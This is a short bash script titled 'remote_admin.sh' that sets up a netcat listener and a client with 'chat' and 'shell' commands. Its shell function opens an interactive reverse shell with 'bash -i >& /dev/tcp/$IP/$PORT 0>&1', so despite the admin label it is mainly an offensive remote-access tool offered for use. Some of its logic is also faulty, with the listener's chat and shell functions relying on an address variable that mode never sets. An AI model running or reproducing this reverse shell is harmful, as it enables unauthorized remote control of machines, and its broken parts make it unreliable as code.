#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if running as root
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] Run as root for full functionality.${NC}"
    sleep 1
fi

# Usage
if [ "$#" -lt 1 ]; then
    echo -e "${GREEN}Usage:${NC}"
    echo "  ./remote_admin.sh listen [PORT]        (Start listener)"
    echo "  ./remote_admin.sh connect [IP] [PORT] (Connect to listener)"
    exit 1
fi

### --- Functions --- ###

# Start listener
start_listener() {
    echo -e "${GREEN}[+] Listening on port $PORT...${NC}"
    while true; do
        echo -e "${YELLOW}[+] Waiting for connection...${NC}"
        nc -lvnp $PORT | while read -r line; do
            if [[ "$line" == *"CONNECT"* ]]; then
                CLIENT_IP=$(echo $line | awk '{print $5}' | cut -d':' -f1)
                echo -e "${GREEN}[+] Connection from: $CLIENT_IP${NC}"
            elif [[ "$line" == "chat" ]]; then
                chat_mode
            elif [[ "$line" == "shell" ]]; then
                reverse_shell
            elif [[ "$line" == "exit" ]]; then
                break
            fi
        done
    done
}

# Connect to listener
connect_to_listener() {
    echo -e "${GREEN}[+] Connecting to $IP:$PORT...${NC}"
    while true; do
        echo -e "${YELLOW}Enter command (chat/shell/exit):${NC}"
        read -r cmd
        if [[ "$cmd" == "chat" ]]; then
            chat_mode
        elif [[ "$cmd" == "shell" ]]; then
            reverse_shell
        elif [[ "$cmd" == "exit" ]]; then
            break
        else
            echo -e "${RED}[!] Invalid command.${NC}"
        fi
    done
}

# Chat mode
chat_mode() {
    echo -e "${GREEN}[+] Chat mode activated. Type 'exit' to quit.${NC}"
    while true; do
        read -r msg
        if [[ "$msg" == "exit" ]]; then
            break
        fi
        echo "$msg" | nc $IP $PORT
    done
}

# Reverse shell
reverse_shell() {
    echo -e "${GREEN}[+] Reverse shell activated. Type 'exit' to quit.${NC}"
    bash -i >& /dev/tcp/$IP/$PORT 0>&1
}

### --- Main Logic --- ###
MODE=$1

if [[ "$MODE" == "listen" ]]; then
    PORT=$2
    if [[ -z "$PORT" ]]; then
        echo -e "${RED}[!] Port not specified.${NC}"
        exit 1
    fi
    start_listener
elif [[ "$MODE" == "connect" ]]; then
    IP=$2
    PORT=$3
    if [[ -z "$IP" || -z "$PORT" ]]; then
        echo -e "${RED}[!] IP or port not specified.${NC}"
        exit 1
    fi
    connect_to_listener
else
    echo -e "${RED}[!] Invalid mode. Use 'listen' or 'connect'.${NC}"
    exit 1
fi
